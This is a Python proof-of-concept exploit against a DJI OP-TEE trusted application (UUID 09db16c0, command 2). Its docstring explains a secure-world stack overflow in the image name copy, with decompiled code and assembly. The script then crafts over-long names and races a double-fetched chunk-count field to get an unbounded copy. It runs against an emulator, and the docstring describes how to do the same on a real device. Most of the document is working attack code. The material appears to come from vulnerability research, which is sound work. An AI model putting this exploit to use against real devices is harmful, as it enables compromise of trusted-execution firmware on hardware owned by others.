#!/usr/bin/env python3
"""PoC — DJI OP-TEE TA 09db16c0, cmd 2 (fw_image_verify_load2ion, FUN_00100798):
secure-world STACK buffer overflow via an unbounded strlen()+memcpy() of the
image *name* field, read twice from CA shared memory (double-fetch).

This is a DIFFERENT bug from the cmd-4 verify-ctx .bss overflow (0x103f74) and
from the (non-vulnerable, single-fetch) chunk-table copy at 0x1039b4.

------------------------------------------------------------------------------
The sink (FUN_00100798, before any signature check):

    uVar1 = *(uint *)(image + 0x9c);              // chunk_count   <- FETCH #1 of +0x9c
    if ((param_5 == 0) || (uVar1 < 2)) {
        if (0x10 < uVar1) return -5;              // the ONLY cap touching +0x9c
        memcpy(local_228, image + 0xc0, uVar1<<5);// chunk table (fits, single-fetch)
        len = strlen(image + 0x40);               // name length   <- reads name (incl. +0x9c)
        memcpy(local_28, image + 0x40, len);      // <-- 0x1008dc SINK: dst = 32-byte stack buf
        ...
        iVar2 = image_verifiy_decrypt(...);       // signature/struct check is AFTER the overflow
    }

  001008c4  bl 0x10c21c     ; strlen(image+0x40)        FETCH (measure name in shared mem)
  001008c8  mov x2, x0      ; len = strlen  -- NO bound vs the 32-byte dst
  001008cc  add x8, x29,#0x278 ; dst = local_28 (32 bytes, then the stack canary)
  001008dc  bl 0x10c170     ; memcpy(dst, image+0x40, len)   FETCH (copy name again)

Two facts make this exploitable:
  1. `strlen(name)` is never bounded against the 32-byte destination -> a name
     longer than 32 bytes smashes the stack canary / caller frame.
  2. The +0x9c field is *fetched twice*: once as `chunk_count` for the <=16 cap
     (FETCH #1), and again while `strlen` walks the name across it. Because the
     name field starts at +0x40, the ONLY thing capping the name at 0x5c (92)
     bytes is that a longer name forces image[0x9c] != 0 -> chunk_count huge ->
     "too many chunks" rejection. A second CA core that presents image[0x9c]==0
     during FETCH #1 (passing the cap) and then sets it non-zero before strlen
     reads it (FETCH #2) defeats that cap and produces an *unbounded* overflow.

------------------------------------------------------------------------------
Reachability / emulator preconditions

cmd 2 dispatch requires paramTypes == 0x1157 and a one-time key-derivation. The
overflow runs *before* image_verifiy_decrypt, so NO signature is needed. We only
model the always-succeeds-on-HW preconditions the bare emulator can't satisfy:

    TAEMU_FORCE_RET0="0x20,0x6af0"
        0x20   = TA_KeyDerivation       (one-time secure-boot key derive)
        0x6af0 = invalidate_image_cache (normal-world cache maintenance)

Neither is an attacker gate; both return success on a real device. Launch:

    cd /srv/emulator
    TAEMU_FORCE_RET0="0x20,0x6af0" \
        python3 -m emulate --tee optee rootfs/09db16c0-873b-4fed-b87ea5d2b86293a2.ta

Then, in another shell:

    python3 poc.py            # deterministic: 92-byte name -> canary smash
    python3 poc.py --race 200 # race +0x9c (the double-fetch) for an unbounded copy

On a real device, build a CA against libteec, invoke cmd 2 with a MEMREF image
whose name field at +0x40 is > 32 bytes (and, for the unbounded variant, race
the +0x9c field from a second thread).
"""
import argparse
import socket
import struct
import sys
import threading
import time
from ctypes import CDLL, c_int, c_size_t, c_void_p, memmove

HOST, PORT = "127.0.0.1", 1337

# func ids (emulate.ta_mgr.FUNCS)
F_INIT, F_OPEN, F_INVOKE, F_CLOSE = 0, 1, 2, 3
F_REGISTER_SHM, F_RELEASE_SHM, F_FINALIZE, F_ALLOC_SHM = 4, 5, 6, 7

# GP TEE_PARAM_TYPE_*
PT_NONE = 0
PT_VALUE_INPUT = 1
PT_MEMREF_INPUT, PT_MEMREF_INOUT = 5, 7

UUID = "09db16c0-873b-4fed-b87e-a5d2b86293a2"
CMD_VERIFY_LOAD2ION = 2
PARAM_TYPES = 0x1157  # MEMREF_INOUT, MEMREF_INPUT, VALUE_INPUT, VALUE_INPUT

# image layout offsets
OFF_NAME = 0x40         # name field (NUL-terminated, strlen'd)
OFF_CHUNKS = 0x9c       # chunk_count (u32); also a NUL-terminator candidate for name
DST_CAP = 0x20          # local_28 stack buffer == 32 bytes, then the stack canary

IPC_CREAT = 0o1000
KEY_IMAGE = 0x9DB0
KEY_DUMMY = 0x9DB1
HANDLE_IMAGE = 0x09DB0000
HANDLE_DUMMY = 0x09DB0001

libc = CDLL("libc.so.6", use_errno=True)
libc.shmget.restype, libc.shmget.argtypes = c_int, (c_int, c_size_t, c_int)
libc.shmat.restype, libc.shmat.argtypes = c_void_p, (c_int, c_void_p, c_int)
libc.shmdt.restype, libc.shmdt.argtypes = c_int, (c_void_p,)
libc.shmctl.restype, libc.shmctl.argtypes = c_int, (c_int, c_int, c_void_p)
IPC_RMID = 0


def _rmid(key: int):
    """Remove a pre-existing segment for `key` (a stale one of the wrong size
    makes shmget(IPC_CREAT) fail with EINVAL)."""
    sid = libc.shmget(key, 0, 0)
    if sid >= 0:
        libc.shmctl(sid, IPC_RMID, None)


def uuid_to_bytes(u: str) -> bytes:
    a, b, c, d = u.split("-", 3)
    node = bytes.fromhex(d.replace("-", ""))
    return struct.pack("<I", int(a, 16)) + struct.pack("<H", int(b, 16)) + \
        struct.pack("<H", int(c, 16)) + node


class SharedMem:
    """A System V segment the emulator attaches to by key; the emulator re-reads
    it live on every shared-memory access, so writes here are seen mid-invoke."""

    def __init__(self, key: int, size: int):
        self.key, self.size = key, size
        _rmid(key)  # drop any stale segment of a different size first
        self.shmid = libc.shmget(key, size, IPC_CREAT | 0o666)
        if self.shmid < 0:
            raise OSError(f"shmget(key={key:#x}) failed")
        self.ptr = libc.shmat(self.shmid, None, 0)
        if self.ptr in (0, -1, c_void_p(-1).value):
            raise OSError("shmat failed")

    def write(self, data: bytes, off: int = 0):
        assert off + len(data) <= self.size
        memmove(self.ptr + off, data, len(data))

    def detach(self):
        libc.shmdt(c_void_p(self.ptr))


class CA:
    def __init__(self, retries: int = 60):
        for _ in range(retries):
            try:
                self.sock = socket.create_connection((HOST, PORT), timeout=5)
                # A crashing invoke leaves the emulator without a reply; bound the
                # wait so we report it instead of blocking forever.
                self.sock.settimeout(20)
                return
            except (ConnectionRefusedError, OSError):
                time.sleep(1)
        raise RuntimeError(f"could not connect to emulator at {HOST}:{PORT}")

    def _txn(self, func: int, payload: bytes, expect_reply=True) -> bytes:
        assert len(payload) < 256
        self.sock.sendall(bytes([func, len(payload)]) + payload)
        if not expect_reply:
            return b""
        resp = self.sock.recv(1024)
        if not resp.startswith(b"ok"):
            raise RuntimeError(f"emulator rejected func {func}: {resp!r}")
        return resp[2:]

    def initialize(self):
        self._txn(F_INIT, b"start")

    def open_session(self) -> int:
        return struct.unpack("<I", self._txn(F_OPEN, uuid_to_bytes(UUID)))[0]

    def register_shm(self, key: int, size: int, handle: int):
        self._txn(F_ALLOC_SHM, struct.pack("<IIQ", key, size, handle))

    @staticmethod
    def _pack_params(params) -> bytes:
        ptypes, blob = 0, b""
        for i, p in enumerate(params):
            kind = p[0]
            if kind == "none":
                ptypes |= PT_NONE << (4 * i)
                blob += b"\x00" * 24
            elif kind == "value":
                _, t, a, b = p
                ptypes |= t << (4 * i)
                blob += struct.pack("<II", a, b) + b"\x00" * 16
            elif kind == "memref":
                _, t, handle, size = p
                ptypes |= t << (4 * i)
                blob += struct.pack("<QQ", handle, size) + b"\x00" * 8
            else:
                raise ValueError(kind)
        return ptypes, blob

    def invoke(self, sid: int, cmd: int, params):
        ptypes, blob = self._pack_params(params)
        assert ptypes == PARAM_TYPES, f"{ptypes:#x} != {PARAM_TYPES:#x}"
        payload = struct.pack("<III", sid, cmd, ptypes) + blob
        ret = struct.unpack("<I", self._txn(F_INVOKE, payload))[0]
        return ret

    def close_session(self, sid: int):
        self._txn(F_CLOSE, struct.pack("<I", sid))

    def finalize(self):
        self._txn(F_FINALIZE, b"quit", expect_reply=False)
        self.sock.close()


def build_session(image_size: int):
    ca = CA()
    ca.initialize()
    sid = ca.open_session()
    img = SharedMem(KEY_IMAGE, image_size)
    dummy = SharedMem(KEY_DUMMY, 0x10)
    ca.register_shm(KEY_IMAGE, image_size, HANDLE_IMAGE)
    ca.register_shm(KEY_DUMMY, 0x10, HANDLE_DUMMY)
    params = [
        ("memref", PT_MEMREF_INOUT, HANDLE_IMAGE, image_size),
        ("memref", PT_MEMREF_INPUT, HANDLE_DUMMY, 0x10),
        ("value", PT_VALUE_INPUT, 0, 0),   # param2 -> value2 (param_4), unused here
        ("value", PT_VALUE_INPUT, 0, 0),   # param3 -> value3 (param_5) == 0 (gate)
    ]
    return ca, sid, img, dummy, params


def deterministic(image_size=0x1000):
    """92-byte name (NUL == chunk_count==0 at +0x9c) -> overflows the 32-byte
    stack buffer + canary. No race; proves the missing bound on strlen()."""
    ca, sid, img, dummy, params = build_session(image_size)

    buf = bytearray(image_size)
    # name: 0x40..0x9b non-NUL (0x5c = 92 bytes); +0x9c == 0 -> NUL terminator
    # AND chunk_count == 0 (passes "<= 16" cap, makes the chunk memcpy 0 bytes).
    for i in range(OFF_NAME, OFF_CHUNKS):
        buf[i] = 0x41
    struct.pack_into("<I", buf, OFF_CHUNKS, 0)
    img.write(bytes(buf))

    name_len = OFF_CHUNKS - OFF_NAME
    print(f"[*] cmd 2, ptypes={PARAM_TYPES:#x}, name_len={name_len:#x} "
          f"({name_len}) into {DST_CAP}-byte stack buf "
          f"-> overflow by {name_len - DST_CAP} bytes (smashes canary)")
    try:
        ret = ca.invoke(sid, CMD_VERIFY_LOAD2ION, params)
        print(f"[*] invoke returned {ret:#010x} "
              f"(no crash; check emulator log for __stack_chk_fail)")
        ca.close_session(sid)
        ca.finalize()
    except (RuntimeError, ConnectionResetError, BrokenPipeError, OSError) as e:
        print(f"[+] emulator socket dropped: {e!r}")
        print("[+] secure-world stack corruption (canary smash / panic) -- "
              "see emulator for the crash PC (memcpy 0x10c170, ret 0x1008e0)")
    img.detach()
    dummy.detach()


def race(iterations: int, image_size=0x2000, far_nul=0x800):
    """Race the +0x9c double-fetch: keep image[0x9c]==0 so the chunk_count cap
    (FETCH #1) passes, but a flipper thread sets it non-zero so strlen (FETCH #2)
    walks past it to a far NUL -> unbounded copy -> crash inside the memcpy."""
    ca, sid, img, dummy, params = build_session(image_size)

    # name region all non-NUL out to OFF_NAME+far_nul, NUL there (bounds strlen
    # so the *memcpy* faults, not strlen). +0x9c starts at 0 (cap passes).
    buf = bytearray(image_size)
    for i in range(OFF_NAME, OFF_NAME + far_nul):
        buf[i] = 0x41
    buf[OFF_NAME + far_nul] = 0
    struct.pack_into("<I", buf, OFF_CHUNKS, 0)
    img.write(bytes(buf))

    stop = threading.Event()
    zero = b"\x00\x00\x00\x00"
    big = b"\xff\xff\xff\xff"

    def flipper():
        # Toggle +0x9c between 0 (chunk_count valid) and non-zero (extends the
        # name past the only cap). The emulator re-fetches shared memory on every
        # read, so FETCH #1 (chunk-count cap) and FETCH #2 (strlen) can observe
        # different values. Bias toward non-zero so that once a brief zero window
        # lets FETCH #1 pass, the later FETCH #2 almost always sees the extended
        # (non-NUL) name -> unbounded copy rather than the bounded 92-byte one.
        while not stop.is_set():
            for _ in range(256):
                img.write(big, OFF_CHUNKS)
            img.write(zero, OFF_CHUNKS)

    t = threading.Thread(target=flipper, daemon=True)
    t.start()
    print(f"[*] racing +0x9c double-fetch over {iterations} invoke(s); "
          f"far NUL at name+{far_nul:#x} (max copy {far_nul:#x} bytes)")
    RET_TOO_MANY = 0xFFFFFFFB   # -5: FETCH #1 saw chunk_count != 0 -> clean reject
    rejects = 0
    try:
        for n in range(iterations):
            try:
                ret = ca.invoke(sid, CMD_VERIFY_LOAD2ION, params)
            except (socket.timeout, TimeoutError) as e:
                # No reply: the bounded (92-byte) overflow smashed the canary and
                # the TA is wedged in __stack_chk_fail. Still a stack overflow.
                print(f"[+] WON (bounded): invoke {n} hung with no reply ({e!r}) "
                      f"-> 92-byte copy smashed the stack canary")
                return
            if ret == RET_TOO_MANY:
                rejects += 1
                continue
            if ret == 0:
                continue
            # Any other code == the TA faulted and run_entry caught it: the
            # extended (unbounded) name copy wrote off the stack.
            print(f"[+] WON (unbounded) on invoke {n}: ret={ret:#010x} after "
                  f"{rejects} clean rejects -> FETCH #1 passed the chunk-count "
                  f"cap, FETCH #2 walked the extended name -> off-stack memcpy")
            print("[+] see emulator log: '_mem_fault invalid memory access ... "
                  "pc=<memcpy 0x...c170>' and 'emulation fault during entry'")
            return
        print(f"[*] no crash in {iterations} invokes ({rejects} rejects); "
              f"raise --race count or adjust flip bias")
        ca.close_session(sid)
        ca.finalize()
    finally:
        stop.set()
        t.join(timeout=1)
    img.detach()
    dummy.detach()


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--race", type=int, metavar="ITERS", nargs="?", const=200,
                    help="race the +0x9c double-fetch (default 200 invokes)")
    args = ap.parse_args()
    if args.race is not None:
        race(args.race)
    else:
        deterministic()


if __name__ == "__main__":
    main()
